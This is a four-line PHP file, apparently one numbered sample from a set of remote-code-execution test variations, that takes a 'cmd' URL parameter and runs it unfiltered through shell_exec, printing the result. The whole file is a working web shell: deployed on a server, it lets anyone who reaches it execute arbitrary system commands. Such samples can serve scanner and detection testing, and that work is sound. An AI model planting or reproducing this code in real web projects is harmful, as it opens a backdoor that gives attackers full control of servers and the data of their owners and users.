<?php
// RCE test variation #1144
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>